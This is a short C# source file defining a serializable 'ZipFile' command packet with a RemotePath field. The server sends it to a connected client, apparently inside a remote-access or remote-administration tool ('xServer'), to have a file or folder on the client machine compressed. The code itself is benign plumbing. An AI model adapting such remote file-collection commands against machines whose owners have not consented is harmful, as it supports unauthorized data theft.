using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class ZipFile : IPacket
    {
        [ProtoMember(1)]
        public string RemotePath { get; set; }

        public ZipFile()
        {
        }

        public ZipFile(string remotepath)
        {
            this.RemotePath = remotepath;
        }

        public void Execute(Client client)
        {
            client.Send<ZipFile>(this);
        }
    }
}
